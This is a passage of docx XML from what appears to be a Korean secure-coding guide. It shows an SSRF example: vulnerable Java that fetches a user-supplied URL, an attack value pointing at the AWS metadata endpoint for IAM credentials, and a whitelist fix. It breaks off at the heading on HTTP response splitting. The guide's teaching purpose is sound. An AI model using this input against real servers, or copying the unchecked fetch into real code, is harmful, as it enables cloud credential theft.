            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무작위</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을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허용해야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하는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경우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내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> IP/URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을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블랙리스트로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차단한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String url = request.getParameter("imageUrl");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>URL obj = new URL(url);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>HttpURLConnection con = (HttpURLConnection) obj.openConnection();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> http://169.254.169.254/latest/meta-data/ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서비스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>imageUrl</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> http://169.254.169.254/latest/meta-data/iam/security-credentials/ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> AWS EC2 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인스턴스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메타데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> API</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>보냅니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>응답으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> IAM </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자격증명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(AccessKey, SecretKey, Token)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> AWS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취될</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>도메인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화이트리스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>적용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>List&lt;String&gt; allowed = Arrays.asList("img.bkr.kr", "cdn.bkrcard.com");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String host = new URL(url).getHost();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!allowed.contains(host)) throw new SecurityException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>허용되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>않는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00836AE5" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  13. HTTP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>응답분할</w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00836AE5">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
